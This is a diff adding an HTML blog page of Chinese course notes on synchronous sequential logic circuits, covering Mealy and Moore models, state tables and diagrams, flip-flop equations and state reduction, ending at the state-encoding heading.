@@ -150,6 +150,197 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-5%E2%80%94%E2%80%94%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-5%E2%80%94%E2%80%94%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/" class="post-title-link" itemprop="url">数字逻辑 Chapter 5——同步时序逻辑电路</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 23:11:54" itemprop="dateCreated datePublished" datetime="2023-02-28T23:11:54+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-02 16:50:25" itemprop="dateModified" datetime="2023-03-02T16:50:25+08:00">2023-03-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/" itemprop="url" rel="index"><span itemprop="name">数字逻辑</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="51-时序逻辑电路概述"><a class="markdownIt-Anchor" href="#51-时序逻辑电路概述"></a> 5.1 时序逻辑电路概述</h1>
+<h2 id="511-时序逻辑电路描述方法"><a class="markdownIt-Anchor" href="#511-时序逻辑电路描述方法"></a> 5.1.1 时序逻辑电路描述方法</h2>
+<p>若逻辑电路在任何时刻产生的稳定输出信号不仅与电路在该时刻的输入信号有关，还与电路过去的输入信号有关，则称为时序逻辑电路。</p>
+<p>根据电路中是否有统一定时信号分为两类：同步时序逻辑电路和异步时序逻辑电路。</p>
+<p>一、逻辑函数表达式<br />
+同步时序逻辑电路的结构与功能，可以用三组逻辑函数表达式描述。</p>
+<ol>
+<li>输出函数表达式：一组反映电路输出Z与输入x和状态y之间关系的表达式。<br />
+Mealy型电路：电路输出与输入和状态均有关<br />
+Moore型电路：电路输出仅与状态有关</li>
+<li>激励函数表达式：控制函数，反映存储电路的输入Y与外部输入x和电路状态y之间的关系<br />
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mi>j</mi></msub><mo>=</mo><msub><mi>g</mi><mi>j</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>y</mi><mi>s</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>j</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">Y_j=g_j(x_1,x_2,...,x_n,y_1,y_2,...,y_s),j=1,2,...,r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></li>
+<li>次态函数表达式：次态函数用于反映同步时序电路的次态与激励函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>和现态y的关系，与触发器类型相关。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>y</mi><mi>l</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msubsup><mo>=</mo><msub><mi>k</mi><mi>l</mi></msub><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>j</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>r</mi><mo separator="true">;</mo><mi>l</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>s</mi></mrow><annotation encoding="application/x-tex">y_l^{n+1}=k_l(Y_j,y_j),j=1,2,...,r;l=1,2,...,s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1555469999999999em;vertical-align:-0.3013079999999999em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.3986920000000005em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013079999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span></span></span></span></li>
+</ol>
+<p>二、状态表<br />
+反映同步时序电路输出Z、次态<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">y^{n+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>与电路输入x、现态y之间的关系的表格，又称状态转移表。Moore型电路的状态表中次态与输出分栏列出，Mealy型电路的状态表中次态与输出在一栏列出。两种电路的状态表中第一栏均为现态，第二栏为次态或次态/输出，其下分多栏对应不同x输入时的y或y/Z。<br />
+状态表清晰地给出了同步时序电路在不同输入和现态下的次态和输出。</p>
+<p>三、状态图<br />
+一种反映同步时序电路状态转换规律及相应输入、输出取值关系的有向图。<br />
+每一个结点均代表一个存储电路状态，对于Moore型电路，其输出写在结点中，代表该结点的存储电路状态产生的输出；对于Mealy型电路，其输出写在箭头上，代表该箭头的发出端的存储电路状态与箭头上的输入共同决定的输出的值。</p>
+<p>四、时间图<br />
+使用波形图的方式表示输入信号、输出信号与电路状态的取值在各时刻的对应关系，通常称为工作波形图。可以表示电路状态的转换时刻。</p>
+<h1 id="52-同步时序逻辑电路分析"><a class="markdownIt-Anchor" href="#52-同步时序逻辑电路分析"></a> 5.2 同步时序逻辑电路分析</h1>
+<h2 id="521-分析方法与步骤"><a class="markdownIt-Anchor" href="#521-分析方法与步骤"></a> 5.2.1 分析方法与步骤</h2>
+<p>表格法与代数法。<br />
+一、表格分析法一般步骤：</p>
+<ul>
+<li>写出输出函数与激励函数表达式</li>
+<li>借助触发器功能表列出电路次态真值表</li>
+<li>画出状态表和状态图（如有必要需画出时间图）</li>
+<li>归纳电路逻辑功能</li>
+</ul>
+<p>二、代数分析法一般步骤：</p>
+<ul>
+<li>写出输出函数表达式和激励函数表达式</li>
+<li>将激励函数表达式代入触发器的次态方程，导出电路的次态方程组</li>
+<li>画出状态表和状态图</li>
+<li>归纳电路逻辑功能</li>
+</ul>
+<p><font color=red><strong>重要：各种触发器输出关于输入和状态的函数（仅列出钟控触发器）</strong><br />
+R-S触发器：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>S</mi><mo>+</mo><mover accent="true"><mi>R</mi><mo>ˉ</mo></mover><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q^{n+1}=S+\bar RQ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0145499999999998em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mord mathnormal">Q</span></span></span></span><br />
+D触发器：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>D</mi></mrow><annotation encoding="application/x-tex">Q^{n+1}=D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span><br />
+J-K触发器：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>J</mi><mover accent="true"><mi>Q</mi><mo>ˉ</mo></mover><mo>+</mo><mover accent="true"><mi>K</mi><mo>ˉ</mo></mover><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q^{n+1}=J\bar Q+\bar KQ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0145499999999998em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">Q</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;"><span class="mord">ˉ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0145499999999998em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mord mathnormal">Q</span></span></span></span><br />
+T触发器：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>T</mi><mover accent="true"><mi>Q</mi><mo>ˉ</mo></mover><mo>+</mo><mover accent="true"><mi>T</mi><mo>ˉ</mo></mover><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q^{n+1}=T\bar Q+\bar TQ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0145499999999998em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">Q</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;"><span class="mord">ˉ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0145499999999998em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mord mathnormal">Q</span></span></span></span><br />
+</font></p>
+<h1 id="53-同步时序逻辑电路设计"><a class="markdownIt-Anchor" href="#53-同步时序逻辑电路设计"></a> 5.3 同步时序逻辑电路设计</h1>
+<p>设计一般步骤：</p>
+<ol>
+<li>根据功能需求形成原始状态图和原始状态表</li>
+<li>状态化简，求出最小化状态表</li>
+<li>状态编码，得到二进制状态表</li>
+<li>选择触发器的类型，求出激励函数与输出函数最简表达式</li>
+<li>画出逻辑电路图</li>
+</ol>
+<h2 id="531-建立原始状态图和原始状态表"><a class="markdownIt-Anchor" href="#531-建立原始状态图和原始状态表"></a> 5.3.1 建立原始状态图和原始状态表</h2>
+<ol>
+<li>确定电路类型：Moore型、Mealy型，大多数需求这两种都可以实现，但复杂程度可能不同</li>
+<li>设定初始状态：时序逻辑电路在输入信号开始作用前的状态</li>
+<li>根据需要记忆的信息添加新的状态：状态数量多少取决于需要记忆和区分的信息量</li>
+<li>确定各时刻电路的输出：Moore型电路指出每个状态对应输出，Mealy型电路指出每个状态和输入的组合对应输出。</li>
+</ol>
+<h2 id="532-状态化简"><a class="markdownIt-Anchor" href="#532-状态化简"></a> 5.3.2 状态化简</h2>
+<ol>
+<li>
+<p>状态等效<br />
+(1) 等效状态：对于所有可能的输入序列，分别从两个状态出发得到的输出序列完全相同，称两个状态等效。判断方法：输出相同且次态满足三种情况之一：次态相同、次态交错或互为现态、次态循环或为等效对。<strong>等效具有传递性</strong>。<br />
+(2) 等效类：若干彼此等效的状态组成的集合，其中任意两个状态均等效。<br />
+(3) 最大等效类：不是其他任何一个等效类的真子集的等效类</p>
+</li>
+<li>
+<p>状态化简<br />
+隐含表法。步骤：<br />
+(1) 作出隐含表<br />
+(2) 找出等效对<br />
+(3) 求出最大等效类<br />
+(4) 状态合并<br />
+(5) 作出最简状态表</p>
+<p>隐含表：<br />
+<img src="1.png" alt="" /></p>
+</li>
+</ol>
+<h2 id="533-状态编码"><a class="markdownIt-Anchor" href="#533-状态编码"></a> 5.3.3 状态编码</h2>
